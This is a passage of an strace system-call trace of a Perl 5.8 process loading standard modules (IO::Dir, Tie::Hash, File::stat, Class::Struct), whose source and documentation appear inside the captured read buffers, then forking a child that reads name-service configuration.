something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
8191  07:22:17.502628 stat64("/etc/perl/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502646 stat64("/etc/perl/Tie/Hash.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.502660 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502672 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.502687 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502700 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.502714 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502726 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.502739 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502751 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.502765 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502777 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.502791 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.502804 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
8191  07:22:17.502825 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.502840 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.502852 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.502871 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
8191  07:22:17.503270 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
8191  07:22:17.503863 read(8, "", 4096) = 0
8191  07:22:17.503912 close(8)          = 0
8191  07:22:17.503960 stat64("/etc/perl/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.503977 stat64("/etc/perl/File/stat.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.503992 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.504019 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504033 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.504046 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504060 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.504073 stat64("/usr/lib/perl5/File/stat.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504086 stat64("/usr/share/perl5/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.504098 stat64("/usr/share/perl5/File/stat.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504112 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.504125 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504139 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.504152 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
8191  07:22:17.504218 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.504234 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.504245 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.504263 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
8191  07:22:17.504717 stat64("/etc/perl/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504736 stat64("/etc/perl/Class/Struct.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.504751 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504764 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.504778 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504796 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.504811 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504824 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.504838 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504851 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.504893 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504909 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.504937 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.504951 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
8191  07:22:17.504973 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
8191  07:22:17.504988 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a418) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.505000 _llseek(10, 0, [0], SEEK_CUR) = 0
8191  07:22:17.505019 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
8191  07:22:17.505490 brk(0x82de000)    = 0x82de000
8191  07:22:17.505841 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
8191  07:22:17.506495 _llseek(10, 6916, [6916], SEEK_SET) = 0
8191  07:22:17.506513 _llseek(10, 0, [6916], SEEK_CUR) = 0
8191  07:22:17.506524 close(10)         = 0
8191  07:22:17.506703 _llseek(8, 1334, [1334], SEEK_SET) = 0
8191  07:22:17.506719 _llseek(8, 0, [1334], SEEK_CUR) = 0
8191  07:22:17.506729 close(8)          = 0
8191  07:22:17.507416 brk(0x82ff000)    = 0x82ff000
8191  07:22:17.527959 _llseek(6, 2689, [2689], SEEK_SET) = 0
8191  07:22:17.528023 _llseek(6, 0, [2689], SEEK_CUR) = 0
8191  07:22:17.528057 close(6)          = 0
8191  07:22:17.528513 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d82908) = 8192
8192  07:22:17.538845 getppid()         = 8191
8192  07:22:17.539223 open("/etc/nsswitch.conf", O_RDONLY) = 6
8192  07:22:17.539256 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8192  07:22:17.539296 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f48000
8192  07:22:17.539344 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8192  07:22:17.539437 read(6, "", 4096) = 0
8192  07:22:17.539452 close(6)          = 0
8192  07:22:17.539466 munmap(0xb7f48000, 4096) = 0
8192  07:22:17.539503 open("/etc/ld.so.cache", O_RDONLY) = 6
8192  07:22:17.539523 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
